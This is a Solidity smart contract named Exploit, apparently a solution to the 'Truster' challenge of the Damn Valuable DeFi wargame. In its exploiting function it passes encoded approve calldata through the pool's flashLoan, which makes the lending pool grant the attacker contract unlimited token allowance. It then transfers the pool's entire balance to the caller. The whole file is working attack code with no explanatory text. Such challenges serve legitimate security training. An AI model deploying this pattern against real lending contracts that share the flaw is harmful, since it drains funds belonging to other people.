// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "./TrusterLenderPool.sol"; 
import "../DamnValuableToken.sol";

contract Exploit {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable truster;
    uint256 constant public MAX_UINT = 2**256 - 1;

    constructor(address _token, address _truster) {
        token = DamnValuableToken(_token);
        truster = TrusterLenderPool(_truster);
    }

    function exploiting() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), MAX_UINT);

        truster.flashLoan(0, msg.sender ,address(token), data);

        token.transferFrom(address(truster), msg.sender, token.balanceOf(address(truster)));
    }

}